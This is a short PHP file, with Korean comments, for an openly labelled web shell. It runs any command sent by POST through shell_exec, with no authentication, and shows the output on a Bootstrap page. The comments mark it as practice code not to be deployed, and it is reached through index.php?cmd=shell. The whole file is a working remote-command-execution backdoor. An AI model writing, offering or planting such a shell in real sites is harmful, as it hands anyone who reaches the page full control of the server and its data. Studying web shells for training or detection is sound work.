<?php
/**
 * shell.php  ‒ 간단 웹 쉘 (UTF‑8 출력 보정)
 *   index.php?cmd=shell 로 접근하면 include
 *   명령 입력 후 실행 결과를 하단에 표시
 *   ⚠️ 실습용: 실제 서비스 배포 금지 (보안 위험)
 */

// 세션 보존(필요 시)
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// POST 로 전달된 명령어
$command = trim($_POST['command'] ?? '');
$output  = '';

if ($command !== '') {
    // 명령 실행 (stderr 포함)  ‒ Windows / *nix 공통
    $raw = shell_exec($command . ' 2>&1');
    if ($raw === null) { $raw = ''; }

    // ─── 한글 깨짐 방지 ───────────────────────────
    // Windows(기본 CP949) 또는 EUC‑KR 결과 → UTF‑8 변환
    $encoding = mb_detect_encoding($raw, ['UTF-8','EUC-KR','CP949','SJIS-win','ISO-8859-1','ASCII'], true);
    if ($encoding && $encoding !== 'UTF-8') {
        $output = @iconv($encoding, 'UTF-8//IGNORE', $raw);
    } else {
        $output = $raw;
    }
}
?>

<!-- ────────── 웹 셸 UI ────────── -->
<form method="post" class="mb-3">
  <div class="row g-0 align-items-center bg-primary text-white rounded overflow-hidden">
    <div class="col-auto px-3 py-2 fw-bold border-end">명령</div>
    <div class="col px-2 py-1 bg-white">
      <input type="text" name="command" class="form-control border-0" placeholder="명령어 입력" value="<?= htmlspecialchars($command, ENT_QUOTES) ?>" required>
    </div>
    <div class="col-auto">
      <button type="submit" class="btn btn-primary h-100 px-4">실행</button>
    </div>
  </div>
</form>

<?php if ($command !== ''): ?>
  <h5 class="fw-bold">&gt; <?= htmlspecialchars($command, ENT_QUOTES) ?></h5>
  <pre class="bg-dark text-light p-3 rounded overflow-auto" style="white-space:pre-wrap;">
<?= htmlspecialchars($output, ENT_QUOTES) ?>
  </pre>
<?php endif; ?>
